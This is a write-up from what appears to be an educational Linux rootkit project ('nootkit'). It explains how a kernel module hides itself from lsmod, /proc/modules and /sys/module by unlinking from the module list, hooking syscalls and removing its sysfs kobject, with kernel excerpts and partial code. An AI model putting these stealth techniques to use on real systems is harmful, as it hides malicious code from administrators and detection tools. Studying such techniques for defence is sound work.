# Nootkit Section 6 - Hiding The Module Itself

This isn't completely foreign ground for me - I've seen in the past `THIS_MODULE` pointing to a linked
list which is used when listing modules. I would guess some code responsible for iterating this would be
in the sysfs implementation of `/sys/module`, which as we saw in [section 1](section-1.md) is the interface
used by `lsmod`. I liked the explaination found [here](https://www.win.tue.nl/~aeb/linux/lk/lk-13.html) of
the whole sysfs krazam.

It seems the `/sys/modules` kset itself gets created here:

```C
/*
 * param_sysfs_init - wrapper for built-in params support
 */
static int __init param_sysfs_init(void)
{
    module_kset = kset_create_and_add("module", &module_uevent_ops, NULL);
    if (!module_kset) {
        printk(KERN_WARNING "%s (%d): error creating kset\n",
            __FILE__, __LINE__);
        return -ENOMEM;
    }
    module_sysfs_initialized = 1;

    version_sysfs_builtin();
    param_sysfs_builtin();

    return 0;
}
```

And the addition of any inserted module to that kset happens in `load_module`, which calls `mod_sysfs_setup`,
which calls `mod_sysfs_init`, which does this:

```C
kobj = kset_find_obj(module_kset, mod->name);
if (kobj) {
    pr_err("%s: module is already loaded\n", mod->name);
    kobject_put(kobj);
    err = -EINVAL;
    goto out;
}

// ...

err = kobject_init_and_add(&mod->mkobj.kobj, &module_ktype, NULL,
    "%s", mod->name);
```

The module list referred to by `THIS_MODULE` however seems to be at a lower level than the kobject - also at `load_module`, a list member
is added by `add_unformed_module` to a static `struct list_head` named `modules` in `kernel/module.c`.
This list is also iterated by the syscall `remove_module` to find a module before unloading it.
This will be a hurdle as we'll have to make sure the module is removable - maybe I'll hook the syscall itself
to handle the case.

However, how does the kset which is `/sys/modules` related? Why would removing a module from the `modules`
list also remove it from the `kset`?

It seems that the procfs `/proc/modules` is in fact linked to that list:

```C
/* Called by the /proc file system to return a list of modules. */
static void *m_start(struct seq_file *m, loff_t *pos)
{
    mutex_lock(&module_mutex);
    return seq_list_start(&modules, *pos);
}
```

I took a secondary look at the strace output for `lsmod` - and it seems indeed that before iterating `/sys/module`,
`lsmod` reads `/proc/modules`. Now, my eyes are open. I have modified the section 1 document to contain this information.

So to completely hide our module, would we have to also modify data related to sysfs (maybe removing the relevant
kobject)? We'll see.

Now to work.

## Hiding A Module From `/proc/modules`

`struct module`s contain a pointer to their list entry, so it's easy as pie. See [src/hide/module.c](../src/hide/module.c).

And just from this, we are unseen in `lsmod`:

```sh
lsmod | grep nootkit
>>> 
```

However, as expected we can't remove the module:

```sh
rmmod nootkit
>>> rmmod: ERROR: ../libkmod/libkmod-module.c:799 kmod_module_remove_module() could not remove 'nootkit': No such file or directory
>>> rmmod: ERROR: could not remove module nootkit: No such file or directory

rmmod blabla
>>> rmmod: ERROR: Module blabla is not currently loaded
```

Which yields a different error than other modules which don't exist. My suspicions were correct, and we are still visible
in `/sys/module`:

```sh
ls /sys/module/nootkit/
>>> coresize  initsize   notes   sections    taint
>>> holders   initstate  refcnt  srcversion  uevent
```

Adding a syscall hook to `delete_module` proved interesting:
We can't call the original delete_module from within this hook; upon returning, the hook's function memory will
have been deallocated. So instead, the first time the module is `rmmod`ed, the module hiding is canceled,
and the hook is unset.
Upon a second `rmmod` the module will be removed regularly.

See the hook implemetnation at [src/arch/x86_64/hide/module_sys.c](../src/arch/x86_64/hide/module_sys.c).

## Hiding A Module From `/sys/module`

This can be done with our `getdents64` hook, by simply hiding the path `/sys/module/nootkit`. `rmmod`ing will still
work the same way, we'll just have to add the `-f` flag so that it won't fail when it doesn't find the name `nootkit`
in `/sys/module`.

I'm not sure this was the intent of the excercise though, so I'll go ahead and 

As we've seen above, to create a sysfs entry a kobject needs to be created and added to the relevant kset.
Consequently, to remove an entry it makes sense you must only remove the kobject from the kset.
In this [neat document](https://www.kernel.org/doc/html/v5.7/core-api/kobject.html#kobject-removal) we can see
that `kobject_del` only drops the reference to the parent kobject (in our case the kset), without destroying
the kobject. Wonderful, because it's good to have the ability to unhide our module in case it's needed.

However there is much behaviour that we need to replicate - subdirectories and files are created additionaly in `mod_sysfs_setup`.
To truly hide and unhide the module, we'd have to replicate `mod_sysfs_setup`'s behaviour; that proved quite hard, as we can't
just call it - both because we don't have all the necessary data for it's arguments, and because it performs actions
which are invalid at the time we would be calling them (e.g. initializing the modules kobject).

After a bit of time of of wrestling and trying to imitate the sysfs setup without breaking things, I decided to just stick
to the basic instruction and *not* restore the entire `/sys/module` directory - but only the parts which are required for
`delete_module` to run without crashing.

Here is what the working routing I came up with looks like - I left the code I tried to truly replicate the untouched module
directory in the comment block, as a monolith of my effort:

```C
void hide_disable_sys_module_this(void)
{
    if (!hide_sys_module_enabled)
        return;

    if (kobject_add(&THIS_MODULE->mkobj.kobj, NULL, THIS_MODULE->name))
        goto error;

    THIS_MODULE->holders_dir = kobject_create_and_add("holders",&THIS_MODULE->mkobj.kobj);
    if (sysfs_create_group(&THIS_MODULE->mkobj.kobj, &THIS_MODULE->sect_attrs->grp))
        goto error;

    kobject_put(&THIS_MODULE->mkobj.kobj);
    hide_sys_module_enabled = false;
    return;

error:
    printk(KERN_ERR "nootkit: Failed to recreate kobject and children");

    /*
     * THIS_MODULE->mkobj.kobj = *kobject_get(&THIS_MODULE->mkobj.kobj);
     * kobject_init_and_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.ktype, NULL, "%s", THIS_MODULE->name);
     * ksyms__sysfs_create_dir_ns(&THIS_MODULE->mkobj.kobj, ksyms__kobject_namespace(&THIS_MODULE->mkobj.kobj));
     * 
     * THIS_MODULE->mkobj.drivers_dir = kobject_create_and_add("drivers", &THIS_MODULE->mkobj.kobj);

     * for (i = 0; THIS_MODULE->modinfo_attrs[i].attr.name != NULL; i++) {
     *   if (sysfs_create_file(&THIS_MODULE->mkobj.kobj, &THIS_MODULE->modinfo_attrs[i].attr) != 0)
     *     break;
     * }
     * 
     * THIS_MODULE->notes_attrs->dir = kobject_create_and_add("notes", &THIS_MODULE->mkobj.kobj);
     * 
     * for (i = 0; i < THIS_MODULE->notes_attrs->notes; ++i)
     *      if (sysfs_create_bin_file(THIS_MODULE->notes_attrs->dir,
     *          &THIS_MODULE->notes_attrs->attrs[i]))
     * 
     * kobject_put(THIS_MODULE->notes_attrs->dir);
     * kobject_put(THIS_MODULE->holders_dir);
     * kobject_put(THIS_MODULE->mkobj.drivers_dir);
     * 
     */
}
```

See [src/hide/module.c](../src/hide/module.c) for the complete implementation.
